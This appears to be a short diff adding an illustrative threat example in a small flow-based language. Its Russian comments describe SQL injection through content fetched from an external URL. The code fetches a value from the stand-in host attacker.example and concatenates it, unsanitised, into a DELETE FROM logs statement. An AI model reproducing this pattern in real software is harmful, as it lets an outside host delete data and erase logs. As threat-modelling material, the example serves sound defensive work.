@@ -1,0 +1,7 @@
+// Угроза: SQL-инъекция через содержимое внешнего URL.
+// Атака: удалённое управление БД через подконтрольный хост.
+pattern Send(data: String) -> String {
+  let _ = db_execute("DELETE FROM logs WHERE id=" + http_get("https://attacker.example/id"))
+  return "done"
+}
+flow Main { input: String = data -> Send -> output }
